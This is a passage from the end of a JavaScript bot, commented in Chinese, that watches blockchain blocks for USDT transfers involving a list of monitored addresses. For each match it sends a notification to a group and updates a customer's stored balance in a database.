                        if (log.topics && log.topics.length >= 3 && log.topics[0] === '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef') {
                          const from = '0x' + log.topics[1].slice(26);
                          const to = '0x' + log.topics[2].slice(26);
                          const amountHex = log.data;
                          const amountWei = BigInt(amountHex);
                          const amount = (Number(amountWei) / Math.pow(10, 6)).toString();
                          
                          console.log(`💸 USDT Transfer: ${from} -> ${to}, 金额: ${amount}`);
                          
                          // 检查是否涉及监听地址
                          let targetAddress = null;
                          let transactionType = null;
                          
                          if (addressList.includes(to.toLowerCase())) {
                            targetAddress = to;
                            transactionType = 'in';
                          } else if (addressList.includes(from.toLowerCase())) {
                            targetAddress = from;
                            transactionType = 'out';
                          }
                          
                          if (targetAddress) {
                            console.log(`🎯 发现监听地址交易: ${targetAddress}, 类型: ${transactionType}`);
                            
                            // 获取用户信息并发送通知
                            const userInfo = await getCompleteUserInfo(targetAddress);
                            if (userInfo) {
                              const isIncome = transactionType === 'in';
                              const amountText = `${isIncome ? '+' : ''}${parseFloat(amount).toFixed(6)} USDT`;
                              const operationType = isIncome ? '客户USDT余额增加' : '客户USDT余额减少';
                              
                              userInfo.transactionAmount = parseFloat(amount);
                              userInfo.transactionType = isIncome ? 'income' : 'expense';
                              userInfo.txHash = tx.hash;
                              
                              // 发送实时通知
                              await sendUserInfoToGroup(userInfo, 'USDT_TRANSACTION');
                              
                              // 记录到数据库
                              await database.updateUserBlockchainData(targetAddress, {
                                ...userInfo,
                                usdtBalance: (parseFloat(userInfo.usdtBalance) + (isIncome ? parseFloat(amount) : -parseFloat(amount))).toString()
                              });
                              
                              console.log(`✅ 实时交易通知已发送: ${targetAddress}`);
                            }
                          }
                        }
                      }
                    }
                  }
                } catch (txError) {
                  console.log(`⚠️ 解析交易失败: ${tx.hash}, 错误: ${txError.message}`);
                }
              }
            }
          }
        } catch (blockError) {
          console.error(`❌ 检查区块 ${blockNum} 失败:`, blockError.message);
        }
      }
      
      lastCheckedBlock = latestBlock;
    }
    
  } catch (error) {
    console.error('❌ 区块链监听失败:', error.message);
  }
}

// 启动机器人
startBot();
